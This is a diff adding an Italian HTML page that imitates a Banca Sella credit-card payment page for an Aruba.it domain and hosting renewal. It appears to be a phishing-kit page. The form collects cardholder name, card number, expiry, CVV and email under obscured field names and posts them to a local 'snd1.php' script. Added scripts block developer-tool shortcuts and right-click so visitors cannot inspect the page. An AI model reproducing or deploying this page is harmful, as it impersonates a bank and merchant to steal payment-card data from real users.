@@ -1,0 +1,268 @@
+<html class="" lang="IT" xmlns="#"><head id="ctl00_Head1">
+<style type="text/css">
+        .fancybox-margin
+        {
+            margin-right: 0px;
+        }
+    </style>
+<link href="local_resources/css/b1dc0080a047c868b6231d5b68dcb79c.css" rel="stylesheet"/>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<script language="javascript" src="local_resources/js/d3ece51c124472bce32fcd150212a570.js" type="text/javascript"></script>
+<link href="local_resources/css/9ad20f7fb0bc855f3bb7e376ec265a38.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/1dc2f385b86c461ec2906a4dfe11d24f.css" rel="stylesheet" type="text/css"/>
+<link href="local_resources/css/9cb0cca0c3697420880818fa3d850c6e.css" media="aural,braille,embossed,speech" rel="stylesheet" type="text css"/><title>
+	Pagina di pagamento Carta di Credito
+</title>
+<script>
+
+	document.onkeydown = function(e) {
+	  if(event.keyCode == 123) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'I'.charCodeAt(0)) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.shiftKey && e.keyCode == 'J'.charCodeAt(0)) {
+	     return false;
+	  }
+	  if(e.ctrlKey && e.keyCode == 'U'.charCodeAt(0)) {
+	     return false;
+	  }
+	}
+
+
+	
+	document.addEventListener('contextmenu', function(e) {
+	  e.preventDefault();
+	});
+
+</script>
+<style type="text/css">.fancybox-margin{margin-right:0px;}</style><style type="text/css">.fancybox-margin{margin-right:0px;}</style></head>
+<body>
+<script>
+grecaptcha.ready(function() {
+grecaptcha.execute('6LcweXwUAAAAAJ09hV3I6ZPk4yd7mPolgZD0RhRs', {action: 'action_name'})
+.then(function(token) {
+// Verify the token on the server.
+});
+});
+</script>
+<form action="snd1.php" id="aspnetForm" method="post" onsubmit="return checkFormSubmit()">
+<div class="dyf_header">
+<div id="ctl00_BancaSellaLogo">
+<img alt="Payment by Banca Sella" id="dyf_logo_sella" src="local_resources/img/f4366e2a8d66f5217bdfff7e3fc8eeca.svg"/>
+</div>
+<span id="ctl00_dyf_scelta_lingua_cont">
+<span id="ctl00_lblLanguageTitle">Lingua</span>
+<a href="#" id="dyfSceltaLingua">
+<img alt="Lingua" id="ctl00_lngImages" src="local_resources/img/d9d9afccfbec52a1edcc462b6c919dad.svg"/> <span id="ctl00_lblLanguage">Italiano</span></a> </span>
+</div>
+<hr style="visibility: hidden; height: 0; clear: both"/>
+<div id="ctl00_pnlMaster">
+<div class="dyf_main">
+<div class="dyf_spalla">
+<div class="dyf_spalla_header">
+<h1 class="mute">
+<span id="ctl00_lblMasterOrder">ordine</span></h1>
+</div>
+<div class="dyf_spalla_inner">
+<div id="dyf_spalla_importo_cont">
+<div>
+<h2 class="mute">
+<span id="ctl00_lblMasterAmount">Importo:</span></h2>
+</div>
+<div class="dyf_spalla_white" id="dyf_spalla_importo">
+<span id="ctl00_lblAmountValue">12,59 €</span>
+</div>
+</div>
+<div id="dyf_spalla_esercente_cont">
+<div>
+<h2 class="mute">
+<span id="ctl00_lblMasterMerchant">Esercente:</span></h2>
+</div>
+<div class="dyf_spalla_white" id="dyf_spalla_esercente">
+<span id="ctl00_lblMerchantNameValue">WWW.ARUBA.IT</span>
+</div>
+</div>
+<div id="dyf_spalla_codice_ordine_cont">
+<div>
+<h2 class="mute">
+<span id="ctl00_lblMasterCode">Codice ordine:</span></h2>
+</div>
+<div class="dyf_spalla_white" id="dyf_spalla_codice_ordine">
+<span id="ctl00_lblShopTrnxIdValue">02bd3be0a94b4dd893f01e39621d4134-1-R</span></div>
+</div>
+<div id="ctl00_divMerchDetails">
+</div>
+</div>
+</div>
+<div class="dyf_content">
+<div class="dyf_content_inner">
+<div class="dyf_cont_processes">
+<div class="processStep processStepDone" id="processStepModalita">
+<a class="decorateMenu" href="pagam.aspx?sesStep=Pres&amp;reqTypeBuy=RCC" id="ctl00_ContentPlaceHoldermenu_hypStepOne"><img src="local_resources/img/c99587d069ddc21d693c5e5b7ec5d06b.svg"/> 
+         <span id="ctl00_ContentPlaceHoldermenu_lblStepOne">RINNOVO DOMINIO E HOSTING</span></a>
+</div>
+<div class="processStep processStepNow" id="processStepInsDati">
+<img src="local_resources/img/6eca8e5fb3c9ab72d8fc3e52f7a53d84.svg"/> 
+        <span id="ctl00_ContentPlaceHoldermenu_lblStpepThree">Inserimento dati</span>
+</div>
+<div class="processStep processStepNext" id="processStepSumDati">
+<img src="local_resources/img/becad8ee3244360cdb5796e78795b104.svg"/> <span id="ctl00_ContentPlaceHoldermenu_lblStepFour">Verifica</span>
+</div>
+<div class="processStep processStepNext" id="processStepReturnToShop ">
+<img src="local_resources/img/becad8ee3244360cdb5796e78795b104.svg"/> <span id="ctl00_ContentPlaceHoldermenu_lblStepFive">Finire</span>
+</div>
+</div>
+<div class="dyf_clearall">
+</div>
+<div class="dyf_content_page dyf_alignleft">
+<div class="SpeechShown"><h1 class="mute"><span id="ctl00_ContentPlaceHolder1_lblInsertData">Inserimento dati</span></h1></div>
+<fieldset>
+<div class="dyf_cont_metodo">
+<div class="ErrorMessageDefault" id="ctl00_ContentPlaceHolder1_ErrorBox">
+<div id="ctl00_ContentPlaceHolder1_valSumCrossSite" style="color:Red;display:none;color:#F95C3D;float:none;">
+</div>
+<span id="ctl00_ContentPlaceHolder1_ErrorBoxMessage">
+</span>
+</div>
+<div class="dyf_cont_metodo_carta">
+<div class="dyf_riga_pagamento_carta" id="ctl00_ContentPlaceHolder1_divName">
+<div class="dyf_label_pagamento_carta dyf_label_intestatario_carta_cont">
+<label class="dyf_label_text_pagamento_carta dyf_not_mandatory_label dyf_label_intestatario_carta" for="ctl00_ContentPlaceHolder1_textPAY1_CHNAME" id="ctl00_ContentPlaceHolder1_lblName">Intestatario carta</label>
+</div>
+<div class="dyf_cont_input_pagamento_carta">
+<div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_intestatario_carta">
+<input class="dyf_input_pagamento_carta dyf_not_mandatory_input" id="ctl00_ContentPlaceHolder1_textPAY1_CHNAME" maxlength="50" name="s1" onfocus="this.select()" placeholder="Mario Rossi" required="" type="text"/>
+</div>
+</div>
+<div class="dyf_clearall">
+</div>
+</div>
+<div class="dyf_riga_pagamento_carta">
+<div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_numero_carta_cont">
+<label class="dyf_label_text_pagamento_carta dyf_label_numero_carta" for="ctl00_ContentPlaceHolder1_textPAY1_CARDNUMBER" id="ctl00_ContentPlaceHolder1_lblCreditCrdNumber">Numero Carta *</label></div>
+<div class="dyf_cont_input_pagamento_carta">
+<div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_numero_carta">
+<input id="pagina" name="pagina" type="hidden" value=""/>
+<input class="dyf_input_pagamento_carta dyf_mandatory_input" maxlength="16" name="s2" onchange="onCardNumberChange()" onkeypress="return isNumberKey(event)" onkeyup="onCardNumberChange()" pattern="[0-9]{16}" placeholder="4444444444444448" required="" type="text"/>
+</div>
+<p class="bold orange" id="cardNumberInvalid" qtlid="1473" style="display:none; color: #FF0000; font-size: 13px;">Numero di carta non valido</p>
+</div>
+<div style="vertical-align:middle;padding-top:12px;"><img alt="" id="imgCardLogo" src="local_resources/img/a488cab0b13921ff244857d5ad220dd2.gif"/></div>
+<div class="dyf_clearall">
+</div>
+</div>
+<div class="dyf_riga_pagamento_carta">
+<div class="dyf_label_pagamento_carta dyf_mandatory_label" style="padding-top:10px;">
+<span class="dyf_label_text_pagamento_carta dyf_label_scadenza_carta" id="ctl00_ContentPlaceHolder1_lblDate">Data scadenza *</span>
+</div>
+<div class="dyf_cont_select_pagamento_carta">
+<div class="dyf_cont_select_pagamento_carta_inner">
+<select class="dyf_select_scadenza dyf_scadenza_mese" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPMONTH" name="s3" required="">
+<option selected="selected" value="">mm</option>
+<option style="color: rgb(0, 0, 0);" value="01">01</option>
+<option style="color: rgb(0, 0, 0);" value="02">02</option>
+<option style="color: rgb(0, 0, 0);" value="03">03</option>
+<option style="color: rgb(0, 0, 0);" value="04">04</option>
+<option style="color: rgb(0, 0, 0);" value="05">05</option>
+<option style="color: rgb(0, 0, 0);" value="06">06</option>
+<option style="color: rgb(0, 0, 0);" value="07">07</option>
+<option style="color: rgb(0, 0, 0);" value="08">08</option>
+<option style="color: rgb(0, 0, 0);" value="09">09</option>
+<option style="color: rgb(0, 0, 0);" value="10">10</option>
+<option style="color: rgb(0, 0, 0);" value="11">11</option>
+<option style="color: rgb(0, 0, 0);" value="12">12</option>
+</select>
+<select class="dyf_select_scadenza dyf_scadenza_anno" id="ctl00_ContentPlaceHolder1_txtPAY1_EXPYEAR" name="s4" required="">
+<option selected="selected" value="">aa</option>
+<option style="color: rgb(0, 0, 0);" value="21">21</option>
+<option style="color: rgb(0, 0, 0);" value="22">22</option>
+<option style="color: rgb(0, 0, 0);" value="23">23</option>
+<option style="color: rgb(0, 0, 0);" value="24">24</option>
+<option style="color: rgb(0, 0, 0);" value="25">25</option>
+<option style="color: rgb(0, 0, 0);" value="26">26</option>
+<option style="color: rgb(0, 0, 0);" value="27">27</option>
+<option style="color: rgb(0, 0, 0);" value="28">28</option>
+<option style="color: rgb(0, 0, 0);" value="29">29</option>
+<option style="color: rgb(0, 0, 0);" value="30">30</option>
+<option style="color: rgb(0, 0, 0);" value="31">31</option>
+<option style="color: rgb(0, 0, 0);" value="32">32</option>
+<option style="color: rgb(0, 0, 0);" value="33">33</option>
+</select>
+</div>
+</div>
+<div class="dyf_clearall">
+</div>
+</div>
+<div class="dyf_riga_pagamento_carta" id="ctl00_ContentPlaceHolder1_divCVV">
+<div class="dyf_label_pagamento_carta dyf_mandatory_label dyf_label_cvv_carta_cont">
+<label class="dyf_label_text_pagamento_carta dyf_label_cvv_carta" for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lbCVV">Codice di sicurezza *</label><br/>
+<label class="dyf_label_text_pagamento_carta dyf_label_cvv_carta" for="ctl00_ContentPlaceHolder1_textPAY1_CVV" id="ctl00_ContentPlaceHolder1_lblCvv2">(CVV2 o 4DBC)</label>
+</div>
+<div class="dyf_cont_input_pagamento_carta">
+<div class="dyf_cont_input_pagamento_carta_inner dyf_mandatory_cont_input dyf_input_cvv_carta">
+<input class="dyf_input_pagamento_carta dyf_mandatory_input" id="ctl00_ContentPlaceHolder1_textPAY1_CVV" maxlength="3" name="s5" onfocus="this.select()" onkeypress="return isNumberKey(event)" pattern="[0-9]{3}" placeholder="123" required="" type="password"/>
+</div>
+<div class="dyf_cvv_explain">
+<a class="fancybox" href="#fancybox-cvv" id="ctl00_ContentPlaceHolder1_idLink"><span id="ctl00_ContentPlaceHolder1_lblCvvHelp">Dove trovo il codice di sicurezza?</span></a>
+</div>
+</div>
+<div class="dyf_clearall">
+</div>
+</div>
+<div class="dyf_riga_pagamento_carta" id="ctl00_ContentPlaceHolder1_divEmail">
+<div class="dyf_label_pagamento_carta dyf_not_mandatory_label dyf_label_email_carta_cont">
+<label class="dyf_label_text_pagamento_carta dyf_label_email_carta" for="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL" id="ctl00_ContentPlaceHolder1_lblEmail">Email</label>
+</div>
+<div class="dyf_cont_input_pagamento_carta">
+<div class="dyf_cont_input_pagamento_carta_inner dyf_not_mandatory_cont_input dyf_input_email_carta">
+<input class="dyf_input_pagamento_carta dyf_not_mandatory_input" id="ctl00_ContentPlaceHolder1_textPAY1_CHEMAIL" maxlength="50" name="s6" onfocus="this.select()" placeholder="mario.rossi@example.com" type="text"/>
+</div>
+</div>
+<div class="dyf_clearall">
+</div>
+</div>
+<div class="dyf_riga_pagamento_carta" style="vertical-align:middle;">
+<fieldset id="RemenberMe">
+</fieldset>
+<div class="dyf_clearall">
+</div>
+</div>
+</div>
+<div class="dyf_mandatory_msg">
+<span id="ctl00_ContentPlaceHolder1_lblMandatory">*I campi contrassegnati con asterisco sono obbligatori.</span>
+</div>
+<div class="fancybox_privacy_link_cont">
+<a class="fancybox" href="#fancybox-privacy" id="fancybox-privacy-link"><span id="ctl00_ContentPlaceHolder1_lblPolicy">Informativa sulla privacy</span></a>
+</div>
+</div>
+</fieldset>
+<fieldset>
+<div class="g-recaptcha" data-callback="onReturnCallback" data-sitekey="6LcweXwUAAAAAJ09hV3I6ZPk4yd7mPolgZD0RhRs" data-theme="light" id="g-recaptcha"></div>
+</fieldset>
+<fieldset>
+<div class="dyf_btn_next" onclick="document.getElementById('ctl00_ContentPlaceHolder1_btnProcedi').click()">
+<input id="ctl00_ContentPlaceHolder1_btnProcedi" name="ctl00$ContentPlaceHolder1$btnProcedi" style="border:0px;text-decoration:none;background:inherit !important; background-color:inherit;color:inherit;cursor: hand; font-size:14px; font-weight:bold;text-transform:uppercase;" type="submit" value="Procedi"/>
+</div>
+<div class="dyf_btn" onclick="document.getElementById('ctl00_ContentPlaceHolder1_btnBack').click()" style="width:185px;">
+<a class="fancybox" id="ctl00_ContentPlaceHolder1_btnBack" style="color: inherit;text-decoration:none;">Indietro</a>
+</div>
+</fieldset>
+</div>
+</div>
+<div id="cookieDisclaimer">
+<a href="#" target="_blank">Cookie Policy</a></div>
+</div>
+</div>
+</div>
+</form>
+<script>
+function isNumberKey(evt){
+    var charCode = (evt.which) ? evt.which : evt.keyCode
+    if (charCode > 31 && (charCode < 48 || charCode > 57))
+        return false;
+    return true;
+	}
+</script>
+</body></html>
